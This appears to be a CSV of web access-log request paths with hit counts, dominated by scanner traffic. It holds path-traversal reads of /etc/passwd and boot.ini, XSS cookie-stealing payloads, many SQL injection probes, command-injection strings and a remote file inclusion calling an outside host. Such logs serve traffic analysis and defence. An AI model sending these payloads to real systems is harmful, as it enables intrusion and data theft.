Frequency,Resource
1,14all.cgi?cfg=../../../../../../../../etc/passwd
1,/jamdb/
1,/nosuchurl/%3E%3Cscript%3Ealert('Vulnerable')%3C/script%3E
1,/sqlqhit.asp
1,/vgn/jsp/errorpage
1,/cgi-bin/aglimpse
1,/TvLBvkHh.home
1,/cgi-bin/auktion.cgi?menue=../../../../../../../../../../etc/passwd
1,/TvLBvkHh.asa
2,/upload/bank-icons/bank-gh.jpg
1,/main.php?basepath=-4819%27%29%20OR%203581%3D9107%23
1,/postnuke/html/modules.php?op=modload&name=News&file=article&sid=<script>alert('Vulnerable');</script>
1,/servlet/org.apache.catalina.Globals/%3Cscript%3Ealert('Vulnerable')%3C/script%3E
1,/cgi/cgiproc
1,"/cgi-bin/FormMail.cgi?<script>alert(\""Vulnerable\"");</script>"
1,/main.php?basepath=-7372%29%29%29%20ORDER%20BY%2010%23
1,/cgi-bin/html2wml.cgi
1,/TvLBvkHh.asp
1,/index.htm
1,/exchange/lib/logon.inc
4,/main.php?basepath=%29%29%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23
1,/phprank/add.php?page=add&spass=1&name=2&siteurl=3&email=%3Cscript%3Ealert(Vulnerable)%3C/script%3E
4,/main.php?basepath=%29%29%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23
1,/main.php?basepath=%29%29%29%20OR%20JSON_KEYS%28%28SELECT%20CONVERT%28%28SELECT%20CONCAT%280x716a6b7671%2C%28SELECT%20%28ELT%285467%3D5467%2C1%29%29%29%2C0x71627a6a71%29%29%20USING%20utf8%29%29%29%20AND%20%28%28%289273%3D9273
1,/logbook.pl?file=../../../../../../../bin/cat%20/etc/passwd%00|
1,/openautoclassifieds/friendmail.php?listing=&lt;script&gt;alert(document.domain);&lt;/script&gt;
1,/cgi-bin/websendmail
1,/cgi-bin/blog/mt-load.cgi
1,/main.php?basepath=-8594%29%29%29%20UNION%20ALL%20SELECT%203922%2C3922%2C3922%2C3922%2C3922%2C3922%2C3922%2C3922%2C3922%2C3922%2C3922%2C3922%2C3922%2C3922%2C3922%2C3922%2C3922%2C3922%2C3922%2C3922%2C3922%2C3922%2C3922%2C3922%2C3922%2C3922%2C3922%2C3922%2C3922%2C3922%2C3922%2C3922%2C3922%2C3922%2C3922%2C3922%2C3922%2C3922%2C3922%2C3922%2C3922%2C3922%2C3922%2C3922%2C3922%2C3922%2C3922%2C3922%2C3922%2C3922%2C3922%2C3922%2C3922%2C3922%2C3922%2C3922%2C3922%2C3922%2C3922%2C3922%2C3922%2C3922%2C3922%2C3922%2C3922%2C3922%2C3922%2C3922%2C3922%2C3922%2C3922%2C3922%2C3922%2C3922%2C3922%2C3922%2C3922%2C3922%2C3922%2C3922%2C3922%2C3922%2C3922%2C3922%2C3922%2C3922%2C3922%2C3922%2C3922%2C3922%2C3922%2C3922%2C3922%23
1,/main.php?basepath=%27%29%20OR%20NOT%204288%3D4288%23
1,/servlets/MsgPage?action=badlogin&msg=<script>alert('Vulnerable')</script>
1,icat
5,/cgi-bin/MsmMask.exe?mask=/junk334
1,/%3Cscript%3Ealert('Vulnerable')%3C/script%3E.thtml
1,/exec/show/config/cr
1,/main.php?basepath=-2088%29%29%29%20UNION%20ALL%20SELECT%208653%2C8653%2C8653%2C8653%2C8653%2C8653%2C8653%2C8653%2C8653%2C8653%2C8653%2C8653%2C8653%2C8653%2C8653%2C8653%2C8653%2C8653%2C8653%2C8653%2C8653%2C8653%2C8653%23
1,/cgi-bin/mt-static/mt-check.cgi
1,/a%5C.aspx
1,//../../../../../../../../../../etc/passwd
1,"/administrator/upload.php?newbanner=1&choice=\""<script>alert(document.cookie)</script>"
1,/test.php?%3CSCRIPT%3Ealert('Vulnerable')%3C%2FSCRIPT%3E=x
1,db4web_c/dbdirname//etc/passwd
1,/TvLBvkHh.nsconfig
1,/netget?sid=user&msg=300&file=../../../../../../../../../boot.ini
1,/modules.php?name=Downloads&d_op=viewdownloaddetails&lid=02&ttitle=<script>alert('Vulnerable')</script>
1,/main.php?basepath=-4790%29%29%29%20UNION%20ALL%20SELECT%207075%2C7075%2C7075%2C7075%2C7075%2C7075%2C7075%2C7075%2C7075%2C7075%2C7075%2C7075%2C7075%2C7075%2C7075%2C7075%2C7075%2C7075%2C7075%2C7075%2C7075%2C7075%2C7075%2C7075%2C7075%2C7075%2C7075%2C7075%2C7075%2C7075%2C7075%2C7075%2C7075%2C7075%2C7075%2C7075%2C7075%2C7075%2C7075%2C7075%2C7075%2C7075%2C7075%2C7075%2C7075%2C7075%2C7075%2C7075%2C7075%2C7075%2C7075%2C7075%2C7075%2C7075%2C7075%2C7075%2C7075%2C7075%2C7075%2C7075%2C7075%2C7075%2C7075%2C7075%2C7075%2C7075%2C7075%2C7075%2C7075%2C7075%2C7075%2C7075%2C7075%2C7075%2C7075%2C7075%2C7075%2C7075%2C7075%2C7075%2C7075%2C7075%2C7075%2C7075%2C7075%2C7075%2C7075%23
2,/cgi-bin/atk/javascript/class.atkdateattribute.js.php?config_atkroot=http://cirt.net/rfiinc.txt?
1,sscd_suncourier.pl
1,/cgi-bin/foxweb.exe
1,/cgi-bin/myguestbook.cgi?action=view
1,query
2,/admin/index.php
1,/web-console/ServerInfo.jsp%00
1,/signon
1,/cgi-bin/book.cgi?action=default&current=|cat%20/etc/passwd|&form_tid=996604045&prev=main.html&list_message_index=10
4,/robots.txt
1,/main.php?basepath=-1980%25%27%20OR%205746%3D5746%23
1,/nsn/..%5Cutil/type.bas
1,/cgi-bin/csChatRBox.cgi?command=savesetup&setup=;system('cat%20/etc/passwd')
1,/cgi-bin/cgitest.exe
1,search
1,/html/partner.php?mainfile=anything&Default_Theme='<script>alert(document.cookie);</script>
1,/index.php?chemin=..%2F..%2F..%2F..%2F..%2F..%2F..%2F%2Fetc
1,/vvx500/
1,/a_security.htm
1,/main.php?basepath=%29%29%29%20UNION%20ALL%20SELECT%208269%2C8269%2CCONCAT%280x716a6b7671%2C0x744947516450524b4371%2C0x71627a6a71%29%2C8269%2C8269%23
1,/TvLBvkHh.showsource
1,/cgi-bin/bannereditor.cgi
1,/cgi-bin/html2chtml.cgi
1,/main.php?basepath=%29%29%29%20OR%20SLEEP%285%29%23
1,/WEB-INF./web.xml
1,/%3Cscript%3Ealert(%22xss%22)%3C/script%3E/index.html
1,/nsn/..%5Cwebdemo/fdir.bas
1,/cgi-bin/MachineInfo
1,/666%0A%0A%3Cscript%3Ealert('Vulnerable');%3C/script%3E666.jsp
1,webmap.cgi
1,/autohtml.php?op=modload&mainfile=x&name=/etc/passwd
4,/main.php?basepath=%29%29%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23
2,/cgi-bin/cgiwrap/~nobody
1,/lpt9.xtp
1,/cgi-bin/post-query
1,/addressbook/index.php?surname=<script>alert('Vulnerable')</script>
1,/main.php?basepath=-6435%27%29%29%20OR%206950%3D3479%23
1,/password.inc
1,/main.php?basepath=-5614%27%20OR%207166%3D8783%23
1,/nsn/..%5Cutil/chkvol.bas
1,/pw/storemgr.pw
1,/guestbook/admin/o12guest.mdb
1,/cgi-bin/blog/mt.cfg
1,/hola/admin/cms/htmltags.php?datei=./sec/data.php
1,admin.cgi?list=../../../../../../../../../../etc/passwd
1,/cgi-bin/YaBB/YaBB.cgi?board=BOARD&action=display&num=<script>alert('Vulnerable')</script>
1,/vgn/asp/previewer
1,/webmail/horde/test.php
1,mt-static/mt.cfg
1,/siteminder
1,/voice/
1,/midicart.mdb
1,/clusterframe.jsp?cluster=<script>alert(document.cookie)</script>
1,/main.php?basepath=%29%20AND%208669%3D1448%20AND%20%282409%3D2409
1,wconsole.dll
1,/servlet/org.apache.catalina.ContainerServlet/%3Cscript%3Ealert('Vulnerable')%3C/script%3E
5,http://httpheader.net/
1,/admentor/adminadmin.asp
1,/cgi-bin/bb-hostsvc.sh?HOSTSVC=../../../../../../../../../../etc/passwd
1,/cgi-bin/bb-hist.sh?HISTFILE=../../../../../../../../../../etc/passwd
1,ImageFolio/admin/admin.cgi
1,viewcvs.cgi/viewcvs/?cvsroot=<script>alert('Vulnerable')</script>
1,cmd1.exe?/c+dir
1,/main.php?basepath=-6507%27%20OR%204517%3D1078%23
1,/main.php?basepath=%29%20AS%20hNCo%20WHERE%201570%3D1570%20AND%203637%3D3688%23
1,/main.php?basepath=%20AND%206090%3D9306
1,/cgi-bin/perl?-v
1,/pm.php?function=sendpm&to=VICTIM&subject=SUBJECT&images=javascript:alert('Vulnerable')&message=MESSAGE&submitpm=Submit
1,webplus.exe?about
1,/cgi-bin/ssi//../../../../../../../etc/passwd
1,/main.php?basepath=-9005%29%29%29%20UNION%20ALL%20SELECT%205962%2C5962%2C5962%2C5962%2C5962%2C5962%2C5962%2C5962%2C5962%2C5962%2C5962%2C5962%2C5962%2C5962%2C5962%2C5962%2C5962%2C5962%2C5962%2C5962%2C5962%2C5962%2C5962%2C5962%2C5962%2C5962%2C5962%2C5962%2C5962%2C5962%2C5962%2C5962%2C5962%2C5962%2C5962%2C5962%2C5962%2C5962%2C5962%2C5962%2C5962%2C5962%2C5962%2C5962%2C5962%2C5962%2C5962%2C5962%2C5962%2C5962%2C5962%2C5962%23
4,/main.php?basepath=%29%29%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23
1,/cgi-bin/virgil.cgi
1,stat.pl
1,/index.php?file=index.php
1,traffic.cgi?cfg=../../../../../../../../etc/passwd
1,vpasswd.cgi
1,/TiVoConnect?Command=QueryContainer&Container=/&Recurse=Yes
1,/z_user_show.php?method=showuserlink&class=<Script>javascript:alert(document.cookie)</Script>&rollid=admin&x=3da59a9da8825&
1,/cgi-bin/info2www
1,/prxdocs/misc/prxrch.idq?CiTemplate=../../../../../../../../../../winnt/win.ini
1,/index.jhtml
1,/modules.php?name=Classifieds&op=ViewAds&id_subcatg=75&id_catg=<script>alert('Vulnerable')</script>
1,/main.php?basepath=%27%29%29%20AND%201916%3D1916%23
1,/cgi-bin/sbcgi/sitebuilder.cgi
2,/db/index.php
1,/cgi-bin/calendar/calendar_admin.pl?config=|cat%20/etc/passwd|
1,search/search.cgi?keys=*&prc=any&catigory=../../../../../../../../../../../../etc
1,/%3Cscript%3Ealert('Vulnerable')%3C/script%3E.shtm
1,/TvLBvkHh.rdf+destype=cache+desformat=PDF
1,/main.php?basepath=-8371%29%29%29%20UNION%20ALL%20SELECT%203891%2C3891%2C3891%2C3891%2C3891%2C3891%2C3891%2C3891%2C3891%2C3891%2C3891%2C3891%2C3891%2C3891%2C3891%2C3891%2C3891%2C3891%2C3891%2C3891%2C3891%2C3891%23
1,/cgi-bin/input.bat?|dir%20..\\..\\..\\..\\..\\..\\..\\..\\..\\
1,/main.php?basepath=-1537%29%29%29%20UNION%20ALL%20SELECT%204816%2C4816%2C4816%2C4816%2C4816%2C4816%2C4816%2C4816%2C4816%2C4816%2C4816%2C4816%2C4816%2C4816%2C4816%2C4816%2C4816%2C4816%2C4816%2C4816%2C4816%2C4816%2C4816%2C4816%2C4816%2C4816%2C4816%2C4816%2C4816%2C4816%2C4816%2C4816%2C4816%2C4816%2C4816%2C4816%2C4816%2C4816%2C4816%2C4816%2C4816%2C4816%2C4816%2C4816%2C4816%2C4816%2C4816%2C4816%2C4816%2C4816%2C4816%2C4816%2C4816%2C4816%2C4816%2C4816%2C4816%2C4816%2C4816%2C4816%2C4816%2C4816%2C4816%2C4816%2C4816%2C4816%2C4816%2C4816%2C4816%2C4816%2C4816%2C4816%23
1,/main.php?basepath=-5274%29%29%29%20UNION%20ALL%20SELECT%205891%2C5891%2CCONCAT%280x716a6b7671%2C0x43645a46646f6d6249507266726c7973487368465872646c696645644d5456536958777956564164%2C0x71627a6a71%29%2C5891%2C5891%23
1,/vgn/vr/Saving
4,/main.php?basepath=%29%29%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23
1,/cgi-bin/way-board.cgi?db=/etc/passwd%00
1,/tftpboot/
1,/spa122/
1,/main.php?basepath=-3204%25%27%29%20OR%205746%3D5746%23
1,/TvLBvkHh.tw
1,hpnst.exe?c=p+i=SrvSystemInfo.html
1,/main.php?basepath=-2437%29%29%29%20UNION%20ALL%20SELECT%206043%2C6043%2C6043%2C6043%2C6043%2C6043%2C6043%2C6043%2C6043%2C6043%2C6043%2C6043%2C6043%2C6043%2C6043%2C6043%2C6043%2C6043%2C6043%2C6043%2C6043%2C6043%2C6043%2C6043%2C6043%2C6043%2C6043%2C6043%2C6043%2C6043%2C6043%2C6043%2C6043%2C6043%23
2,/imp/horde/test.php
1,auction/auction.cgi?action=Sort_Page&View=Search&Page=0&Cat_ID=&Lang=English&Search=All&Terms=<script>alert('Vulnerable');</script>&Where=&Sort=Photo&Dir=
1,/cgi-bin/snorkerz.bat
1,rpm_query
1,/panasonic/
2,cgiwrap/~lp
1,/cgi-bin/emu/html/emumail.cgi?type=/../../../../../../../../../../../../../../../../etc/passwd%00
1,/wx/s.dll?d=/boot.ini
1,architext_query.cgi
1,/%5BSecCheck%5D/..%255c..%255c../ext.ini
4,/main.php?basepath=%29%29%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%23
1,/imp/mailbox.php3?actionID=6&server=x&imapuser=x';somesql+--&pass=x
1,/SiteServer/Admin/commerce/foundation/domain.asp
1,/VoIP/
2,/xampp/phpmyadmin/index.php
1,/webadmin.nsf
1,/forums//phpmyadmin/config.php
1,"/cgi-bin/athcgi.exe?command=showpage&script='],[0,0]];alert('Vulnerable');a=[['"
1,/basilix/message-read.php3
1,probecontrol.cgi?command=enable&userNikto=cancer&password=killer
1,/uploadn.asp
1,/main.php?basepath=-4799%27%29%20OR%205746%3D5746%23
1,/vgn/ac/fsave
4,/main.php?basepath=%29%29%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23
1,/TvLBvkHh.properties
1,main.cgi?board=FREE_BOARD&command=down_load&fileNikto=../../../../../../../../../../etc/passwd
1,/home.asp
1,FormHandler.cgi?realname=aaa&email=aaa&reply_message_template=%2Fetc%2Fpasswd&reply_message_from=sq%40example.com&redirect=http%3A%2F%2Fwww.example.com&recipient=sq%40example.com
1,/main.php?basepath=%29%29%29%20AND%20%28SELECT%202%2A%28IF%28%28SELECT%20%2A%20FROM%20%28SELECT%20CONCAT%280x716a6b7671%2C%28SELECT%20%28ELT%287328%3D7328%2C1%29%29%29%2C0x71627a6a71%2C0x78%29%29s%29%2C%208446744073709551610%2C%208446744073709551610%29%29%29%20AND%20%28%28%284614%3D4614
1,/modules.php?op=modload&name=Wiki&file=index&pagename=<script>alert('Vulnerable')</script>
1,/main.php?basepath=%29%29%29%20AND%20JSON_KEYS%28%28SELECT%20CONVERT%28%28SELECT%20CONCAT%280x716a6b7671%2C%28SELECT%20%28ELT%285647%3D5647%2C1%29%29%29%2C0x71627a6a71%29%29%20USING%20utf8%29%29%29%20AND%20%28%28%282061%3D2061
1,/index.html.bak
3,cgiwrap/~root
1,/cgi-bin/pollit/Poll_It_SSI_v2.0.cgi?data_dir=\etc\passwd%00
1,/%25NETHOOD%25/
1,/db/users.dat
4,/main.php?basepath=%29%29%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23
1,/cfappman/index.cfm
1,/TvLBvkHh.VALIDATE_STMT
1,aglimpse
4,/main.php?basepath=%29%29%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23
1,whois.cgi?action=load&whois=%3Bid
1,/main.php?basepath=-3314%29%29%29%20UNION%20ALL%20SELECT%202126%2C2126%2C2126%2C2126%2C2126%2C2126%2C2126%2C2126%2C2126%2C2126%2C2126%2C2126%2C2126%2C2126%2C2126%2C2126%2C2126%2C2126%2C2126%2C2126%2C2126%2C2126%2C2126%2C2126%2C2126%2C2126%2C2126%2C2126%2C2126%2C2126%2C2126%2C2126%2C2126%2C2126%2C2126%2C2126%2C2126%2C2126%2C2126%2C2126%2C2126%2C2126%2C2126%2C2126%2C2126%2C2126%2C2126%2C2126%2C2126%2C2126%2C2126%2C2126%2C2126%2C2126%2C2126%2C2126%2C2126%2C2126%2C2126%2C2126%2C2126%2C2126%2C2126%2C2126%2C2126%2C2126%2C2126%2C2126%2C2126%2C2126%2C2126%2C2126%2C2126%2C2126%2C2126%2C2126%2C2126%2C2126%2C2126%2C2126%2C2126%2C2126%2C2126%23
1,perl.exe?-v
1,ssi//../../../../../../../etc/passwd
1,/cgi-bin/view-source
1,DCShop/auth_data/auth_user_file.txt
1,/cgi-bin/stat.pl
1,/../../../../../../../../../boot.ini
1,quickstore.cgi?page=../../../../../../../../../../etc/passwd%00html&cart_id=
1,/pma/index.php
1,urlcount.cgi?%3CIMG%20SRC%3D%22%22%20ONERROR%3D%22alert%28%27Vulnerable%27%29%22%3E
1,/main.php?basepath=-7113%29%29%29%20UNION%20ALL%20SELECT%209513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%2C9513%23
2,"/admin/sh_taskframes.asp?Title=Configuraci%C3%B3n%20de%20registro%20Web&URL=MasterSettings/Web_LogSettings.asp?tab1=TabsWebServer%26tab2=TabsWebLogSettings%26__SAPageKey=5742D5874845934A134CD05F39C63240&ReturnURL=\""><script>alert(document.cookie)</script>"
1,/main.php?basepath=-1625%25%27%20OR%207563%3D9714%23
1,whois.cgi?lookup=;&ext=/bin/cat%20/etc/passwd
1,index.js0x70
1,/cgi-bin/sewse?/home/httpd/html/sewse/jabber/comment2.jse+/etc/passwd
1,/pm_buddy_list.asp?name=A&desc=B%22%3E<script>alert('Vulnerable')</script>%3Ca%20s=%22&code=1
1,/modules.php?op=modload&name=books&file=index&req=search&query=|script|alert(document.cookie)|/script|
4,/main.php?basepath=%29%29%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23
1,/main.php?basepath=%29%29%29%3BSELECT%20SLEEP%285%29%23
1,/TvLBvkHh.fhp
1,"/downloads/pafiledb.php?action=rate&id=4?\""&lt;script&gt;alert('Vulnerable')&lt;/script&gt;\"""
1,/TvLBvkHh.cnf
2,cgiwrap/~daemon
1,/TvLBvkHh.
1,/TvLBvkHh/
4,/main.php?basepath=%29%29%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23
1,/comments/browse.php?fid=2&tid=4&go=&lt;script&gt;alert('Vulnerable')&lt;/script&gt;
1,/TvLBvkHh.exe
1,/webcart/orders/
1,/main.php?basepath=%29%29%29%3BSELECT%20BENCHMARK%285000000%2CMD5%280x4e4e6a4e%29%29%23
1,/dev/translations.php?ONLY=%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd%00
1,uploader.exe
1,/main.php?basepath=%29%29%29%20AND%20EXTRACTVALUE%288885%2CCONCAT%280x5c%2C0x716a6b7671%2C%28SELECT%20%28ELT%288885%3D8885%2C1%29%29%29%2C0x71627a6a71%29%29%20AND%20%28%28%282187%3D2187
1,/catinfo?<u><b>TESTING
1,/cgi-bin/viralator.cgi
1,/main.php?basepath=-2006%29%29%29%20UNION%20ALL%20SELECT%201277%2C1277%2C1277%2C1277%2C1277%2C1277%2C1277%2C1277%2C1277%2C1277%2C1277%2C1277%2C1277%2C1277%2C1277%2C1277%2C1277%2C1277%2C1277%2C1277%2C1277%2C1277%2C1277%2C1277%2C1277%2C1277%2C1277%2C1277%2C1277%2C1277%2C1277%2C1277%2C1277%2C1277%2C1277%2C1277%2C1277%2C1277%2C1277%2C1277%2C1277%2C1277%2C1277%2C1277%2C1277%2C1277%2C1277%2C1277%2C1277%2C1277%2C1277%2C1277%2C1277%2C1277%2C1277%2C1277%2C1277%2C1277%2C1277%2C1277%2C1277%2C1277%2C1277%2C1277%2C1277%2C1277%23
1,/jigsaw/
1,/main.php?basepath=%22%29%29%29%20AND%201916%3D1916%23
1,//comment.php?mode=Delete&sid=1&cid=&lt;script&gt;alert(document.cookie)&lt;/script&gt;
1,awstats/awstats.pl
1,/cgi-bin/mail
1,/cgi-bin/fom/fom.cgi?cmd=<script>alert('Vulnerable')</script>&file=1&keywords=vulnerable
1,/cgi-bin/admin/setup.cgi
1,wais.pl
1,/.cobalt/sysManage/../admin/.htaccess
2,/getcfg.php
4,/main.php?basepath=%29%29%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23
